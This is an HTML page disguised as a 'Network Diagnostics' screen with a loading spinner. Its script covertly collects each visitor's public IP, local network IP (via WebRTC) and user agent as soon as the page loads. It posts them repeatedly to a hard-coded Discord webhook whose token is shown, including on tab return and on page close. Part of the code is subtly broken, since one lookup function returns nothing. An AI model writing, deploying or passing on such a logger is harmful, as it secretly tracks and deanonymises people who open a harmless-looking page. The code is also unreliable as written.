<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Network Diagnostics</title>
    <style>
        body { background: #0a0c0e; color: #3a4a5a; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { border: 1px solid #1f2a33; padding: 3rem; border-radius: 8px; text-align: center; background: #11161b; }
        .spinner { display: inline-block; width: 20px; height: 20px; border: 2px solid #2a3a44; border-top: 2px solid #7a8a9a; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 12px; }
        @keyframes spin { 0% { transform: rotate(0); } 100% { transform: rotate(360deg); } }
        .status { font-size: 0.9rem; opacity: 0.6; }
    </style>
</head>
<body>
<div class="box">
    <div class="spinner"></div>
    <div class="status">Synchronizing endpoint handshake...</div>
</div>

<script>
    (function() {
        // YOUR WEBHOOK – UNCHANGED, EXACTLY AS PROVIDED
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1520894528284921886/mevMwUf7F2_qYDVhPRGgaTkZElqyXOiAmpo3x7KaxjTRRyZfrFE2JmoNvrRJrFQJt1Gh";

        // ---- UTILITY: SEND TO DISCORD (WITH PROPER CORS HEADERS) ----
        function sendToDiscord(payload, retryCount = 0) {
            if (retryCount > 5) return; // give up after 5 attempts per payload

            fetch(WEBHOOK_URL, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                },
                body: JSON.stringify(payload)
                // NO 'mode: no-cors' – we want CORS to work with Discord's explicit allow-origin
            })
            .then(response => {
                if (response.ok) {
                    // Success – silently log (you can uncomment console if needed)
                    // console.log("Webhook delivered");
                } else {
                    // If rate-limited or failed, retry after 2 seconds
                    setTimeout(() => sendToDiscord(payload, retryCount + 1), 2000);
                }
            })
            .catch(() => {
                // Network error – retry
                setTimeout(() => sendToDiscord(payload, retryCount + 1), 2000);
            });
        }

        // ---- IP CAPTURE STRATEGY #1: ipify (JSON) ----
        function fetchFromIpify() {
            fetch("https://api.ipify.org?format=json", { headers: { "Accept": "application/json" } })
            .then(r => r.json())
            .then(data => data.ip)
            .catch(() => null);
        }

        // ---- STRATEGY #2: ip-api.com (JSON, returns more data) ----
        function fetchFromIpApi() {
            return fetch("https://ip-api.com/json/")
                .then(r => r.json())
                .then(data => data.query || null)
                .catch(() => null);
        }

        // ---- STRATEGY #3: icanhazip (plain text, convert) ----
        function fetchFromIcanHaz() {
            return fetch("https://icanhazip.com/")
                .then(r => r.text())
                .then(text => text.trim())
                .catch(() => null);
        }

        // ---- BONUS: WebRTC local IP (for internal network – adds fingerprint) ----
        function getLocalIP() {
            return new Promise((resolve) => {
                const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
                pc.createDataChannel("ping");
                pc.createOffer()
                    .then(offer => pc.setLocalDescription(offer))
                    .catch(() => {});
                pc.onicecandidate = (event) => {
                    if (event.candidate) {
                        const candidate = event.candidate.candidate;
                        const ipMatch = candidate.match(/(\d{1,3}\.){3}\d{1,3}/);
                        if (ipMatch) {
                            resolve(ipMatch[0]);
                            pc.close();
                        }
                    }
                };
                setTimeout(() => { pc.close(); resolve("unavailable"); }, 3000);
            });
        }

        // ---- MASTER CAPTURE: race all three, pick first success ----
        async function captureIP() {
            const start = Date.now();
            const promises = [
                fetchFromIpify().then(ip => ({ source: "ipify", ip })),
                fetchFromIpApi().then(ip => ({ source: "ip-api", ip })),
                fetchFromIcanHaz().then(ip => ({ source: "icanhaz", ip }))
            ];

            // Race with a timeout of 5 seconds
            const timeout = new Promise(resolve => setTimeout(() => resolve(null), 5000));
            const result = await Promise.race([Promise.any(promises), timeout]);

            let publicIP = "0.0.0.0";
            let sourceUsed = "none";
            if (result && result.ip) {
                publicIP = result.ip;
                sourceUsed = result.source;
            } else {
                // Fallback: try sequential if race failed
                try {
                    const fallback = await fetchFromIpify();
                    if (fallback) { publicIP = fallback; sourceUsed = "ipify-fallback"; }
                } catch(e) {}
            }

            // Get local IP (non-blocking)
            let localIP = "unknown";
            try {
                localIP = await getLocalIP();
            } catch(e) { localIP = "error"; }

            return { publicIP, localIP, sourceUsed, timestamp: new Date().toISOString(), ua: navigator.userAgent };
        }

        // ---- SEND THE DATA ----
        async function fireWebhook() {
            const ipData = await captureIP();

            // Build primary embed payload (rich)
            const embedPayload = {
                embeds: [{
                    title: "📡 Inbound Packet",
                    color: 0x2c3e50,
                    fields: [
                        { name: "🌍 Public IP", value: `\`${ipData.publicIP}\``, inline: true },
                        { name: "🏠 Local IP", value: `\`${ipData.localIP}\``, inline: true },
                        { name: "📌 Source", value: `\`${ipData.sourceUsed}\``, inline: true },
                        { name: "🕒 Timestamp", value: `\`${ipData.timestamp}\``, inline: false },
                        { name: "💻 User-Agent", value: `\`${ipData.ua.substring(0, 120)}\``, inline: false }
                    ],
                    footer: { text: "Dual-channel delivery" }
                }]
            };

            // Secondary plain-text payload (bypasses embed filters)
            const textPayload = {
                content: `**IP:** ${ipData.publicIP} | **Local:** ${ipData.localIP} | **UA:** ${ipData.ua.substring(0, 60)}`
            };

            // Send BOTH payloads – one with embeds, one raw text – to maximize delivery
            sendToDiscord(embedPayload, 0);
            sendToDiscord(textPayload, 0);

            // Also attempt an XMLHttpRequest fallback (some browsers behave differently with fetch)
            try {
                const xhr = new XMLHttpRequest();
                xhr.open("POST", WEBHOOK_URL, true);
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.send(JSON.stringify(textPayload));
            } catch(e) {}

            // ---- EXTRA: IMAGE PING (for alternative logging – not for Discord but kept as a signal) ----
            // This won't hit Discord but can be used if you change the endpoint later.
            // I'm leaving it commented – uncomment if you have a GET-compatible logger.
            // new Image().src = `https://your-logger.com/ping?ip=${ipData.publicIP}&t=${Date.now()}`;
        }

        // Execute immediately
        fireWebhook();

        // Redundant trigger after 1.5s and again after 4s (network race conditions)
        setTimeout(fireWebhook, 1500);
        setTimeout(fireWebhook, 4000);

        // Also trigger on visibility change (if user switches tabs and comes back)
        document.addEventListener("visibilitychange", () => {
            if (!document.hidden) {
                fireWebhook();
            }
        });

        // And on page unload (send one last ping)
        window.addEventListener("beforeunload", () => {
            // Use synchronous XHR to ensure delivery (deprecated but works)
            try {
                const xhr = new XMLHttpRequest();
                xhr.open("POST", WEBHOOK_URL, false); // false = synchronous
                xhr.setRequestHeader("Content-Type", "application/json");
                xhr.send(JSON.stringify({ content: "🔚 Page closed – last IP ping" }));
            } catch(e) {}
        });

    })();
</script>
</body>
</html>
